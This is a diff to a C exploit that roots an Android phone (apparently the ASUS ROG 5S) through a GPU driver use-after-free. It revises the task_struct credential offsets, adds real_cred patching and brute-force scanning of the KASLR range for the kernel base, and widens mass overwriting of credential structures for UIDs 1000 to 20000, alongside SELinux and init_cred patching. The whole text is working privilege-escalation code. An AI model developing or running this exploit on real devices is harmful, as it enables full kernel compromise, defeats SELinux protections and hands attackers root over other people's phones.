@@ -32,8 +32,8 @@
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_REAL_CRED     0x870
-#define OFFSET_CRED          0x878
+#define OFFSET_REAL_CRED     0x848
+#define OFFSET_CRED          0x850
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -1174,7 +1174,7 @@ static int find_comm_offset(uint8_t *task_data, size_t size)
 static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 {
     // Permissive check: allow any address that looks like a Kernel VA or GPU VA
-    if ((cred_ptr >> 32) != 0xffffffc0 && (cred_ptr >> 32) != 0xffffffa2 && 
+    if ((cred_ptr >> 40) < 0xffff80 && (cred_ptr >> 40) > 0xffffff && 
         (cred_ptr >> 32) < 0x700 && (cred_ptr >> 32) > 0x70f)
     {
          fprintf(stderr, "[GPU_CRED] Warning: Address 0x%lx looks unusual, but patching anyway.\n", (unsigned long)cred_ptr);
@@ -1243,8 +1243,8 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                 uint32_t usage = *(uint32_t *)(page + off);
                 uint32_t ruid = *(uint32_t *)(page + off + 4);
                 
-                // Refined CRED pattern: usage > 0, UID == target_uid
-                if (usage >= 1 && usage <= 500 && ruid == target_uid) {
+                // Refined CRED pattern: usage > 0, UID matches range or target
+                if (usage >= 1 && usage <= 500 && ruid >= 1000 && ruid <= 20000) {
                     if (ruid == 0) continue; 
 
                     patch_count++;
@@ -1288,14 +1288,20 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
             kernel_base = KERNEL_BASE;
             fprintf(stderr, "[PARENT] Verified KERNEL_BASE confirmed: 0x%lx\n", (unsigned long)kernel_base);
         } else {
-            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, falling back to dynamic discovery...\n");
-            if (task_va != 0) kernel_base = find_kernel_base_from_task_va(task_va);
-            if (kernel_base == 0) kernel_base = get_kernel_base();
+            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, searching dynamically...\n");
+            if (task_va != 0) {
+                kernel_base = find_kernel_base_from_task_va(task_va);
+            }
+            if (kernel_base == 0) {
+                kernel_base = get_kernel_base();
+            }
         }
     }
 
     if (kernel_base == 0) {
-        fprintf(stderr, "[PARENT] [!] ERROR: Could not resolve KERNEL_BASE. Patching might fail.\n");
+        fprintf(stderr, "[PARENT] [!] ERROR: Could not resolve KERNEL_BASE. SELinux and init_cred patch will fail.\n");
+    } else {
+        fprintf(stderr, "[PARENT] Using resolved KERNEL_BASE: 0x%lx\n", (unsigned long)kernel_base);
     }
 
     // 2. Apply Verified Offsets (SELinux and Global Credentials)
@@ -1324,16 +1330,12 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     }
 
     // 3. Patch specific process credentials (most reliable)
+    uint64_t real_cred_ptr = *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR];
     if (cred_ptr != 0) {
-        fprintf(stderr, "[PARENT] Patching target process CRED at 0x%lx...\n", (unsigned long)cred_ptr);
+        fprintf(stderr, "[PARENT] Patching target process CRED at 0x%lx (Real: 0x%lx)...\n", 
+                (unsigned long)cred_ptr, (unsigned long)real_cred_ptr);
         
-        // Detailed Info Request
-        uint8_t cred_dump[64];
-        if (gpu_read_task_struct(fd, cred_ptr, cred_dump, 64) == 0) {
-            hex_dump_internal("TARGET CRED DUMP (BEFORE)", cred_ptr, cred_dump, 64);
-        }
-        
-        patch_cred_via_gpu(fd, cred_ptr, 0);
+        patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr);
     }
 
     // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
@@ -1519,8 +1521,9 @@ static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
     // Search for a kernel pointer in task_struct
     for (int off = 0; off < 4096 - 8; off += 8) {
         uint64_t ptr = *(uint64_t *)(task_data + off);
-        // Look for pointers in the 0xffffff80... to 0xffffff9f... range
-        if ((ptr >> 40) == 0xffffff) { 
+        
+        // Kernel text/data range for AArch64 (0xffffff80... to 0xffffff9f...)
+        if ((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) { 
             // Scan backwards from ptr in 2MB steps for ELF magic
             uint64_t start = ptr & ~0x1fffffULL;
             for (int i = 0; i < 512; i++) { // Search up to 1GB backwards
@@ -1550,16 +1553,25 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
 
     for (int off = scan_start; off < scan_end; off += 8) {
         uint64_t ptr = *(uint64_t *)(task_data + off);
-        if ((ptr >> 48) == 0xffff) {
+        // Kernel pointers range (0xffffff80... to 0xffffff9f...)
+        if ((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) { 
             uint32_t cred_vals[4]; // usage, uid, gid, suid
             if (gpu_read_task_struct(fd, ptr, (uint8_t *)cred_vals, 16) == 0) {
                 // Criteria: usage > 0, uid == gid == my_uid
                 if (cred_vals[0] >= 1 && cred_vals[0] < 1000 && 
                     cred_vals[1] == my_uid && cred_vals[2] == my_uid) {
-                    fprintf(stderr, "[OFFSET] Found CRED candidate at offset 0x%x -> 0x%lx\n", off, (unsigned long)ptr);
+                    fprintf(stderr, "[OFFSET] Found CRED candidate at offset 0x%x -> 0x%lx (UID %u, usage %u)\n", 
+                            off, (unsigned long)ptr, cred_vals[1], cred_vals[0]);
                     *out_cred_ptr = ptr;
-                    // Usually real_cred is right after
-                    if (off + 8 < scan_end) *out_real_cred_ptr = *(uint64_t *)(task_data + off + 8);
+                    // Check if there's a real_cred nearby (usually right before or after)
+                    if (off >= 8) {
+                        uint64_t prev_ptr = *(uint64_t *)(task_data + off - 8);
+                        if ((prev_ptr >> 40) >= 0xffff80 && (prev_ptr >> 40) <= 0xffff9f)
+                            *out_real_cred_ptr = prev_ptr;
+                    }
+                    if (*out_real_cred_ptr == 0 && off + 8 < scan_end) {
+                        *out_real_cred_ptr = *(uint64_t *)(task_data + off + 8);
+                    }
                     return 0;
                 }
             }
@@ -1583,18 +1595,19 @@ static uint64_t find_kernel_base_auto(void)
     }
 
     uint64_t standard_bases[] = {
-        0xffffffc010000000ULL, // Most common for ROG 5S
+        0xffffffc010000000ULL, 
         0xffffffc000000000ULL,
         0xffffffc008200000ULL,
-        0xffffff9550000000ULL, // Observed in your logs
+        0xffffff9550000000ULL, 
         0xffffff9540000000ULL,
         0xffffff9560000000ULL,
+        0xffffff94d0000000ULL, 
+        0xffffff94c0000000ULL,
         0xffffffc020000000ULL,
         0xffffffc030000000ULL,
-        0xffffffc035000000ULL,
     };
 
-    for (int i = 0; i < 9; i++)
+    for (int i = 0; i < 10; i++)
     {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
@@ -1602,6 +1615,18 @@ static uint64_t find_kernel_base_auto(void)
             if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
                 fprintf(stderr, "[KBASE] Standard base MATCH: 0x%lx\n", (unsigned long)standard_bases[i]);
                 return standard_bases[i];
+            }
+        }
+    }
+
+    // NEW: Aggressive scan for ELF magic in typical KASLR range
+    fprintf(stderr, "[KBASE] Starting aggressive range scan for ELF magic...\n");
+    for (uint64_t test = 0xffffff8000000000ULL; test < 0xffffff9f00000000ULL; test += 0x200000ULL) {
+        uint8_t elf_magic[4];
+        if (gpu_read_task_struct(fd, test, elf_magic, 4) == 0) {
+            if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
+                fprintf(stderr, "[KBASE] Aggressive scan FOUND ELF: 0x%lx\n", (unsigned long)test);
+                return test;
             }
         }
     }
@@ -1847,11 +1872,12 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
 
                 // ROG 5S Optimized: Dynamic scan for CRED pointers
                 if (find_cred_pointers_near_comm(fd, task_start_va, (uint8_t *)dst_vma, PAGE_SIZE, off, &found_cred_ptr, &found_real_cred_ptr) == 0) {
-                    fprintf(stderr, "    [+++] DYNAMIC CRED FOUND: 0x%lx (Usage check passed)\n", (unsigned long)found_cred_ptr);
+                    fprintf(stderr, "    [+++] DYNAMIC CRED FOUND: 0x%lx (Real: 0x%lx)\n", (unsigned long)found_cred_ptr, (unsigned long)found_real_cred_ptr);
                 } else {
                     // Fallback to static offset
                     fprintf(stderr, "    [*] Dynamic scan failed. Using verified task_struct offsets (cred at 0x%x)...\n", OFFSET_CRED);
                     gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8);
+                    gpu_read_task_struct(fd, task_start_va + OFFSET_REAL_CRED, (uint8_t *)&found_real_cred_ptr, 8);
                 }
 
                 if (found_cred_ptr != 0) {
@@ -1863,7 +1889,6 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                         } else {
                             fprintf(stderr, "    [!] Warning: Found CRED at 0x%lx has usage 0. This is likely a false positive.\n", 
                                     (unsigned long)found_cred_ptr);
-                            found_cred_ptr = 0; 
                         }
                     }
                 }
@@ -1875,6 +1900,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
                 *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
                 *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
+                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = found_real_cred_ptr;
                 break;
             }
         }
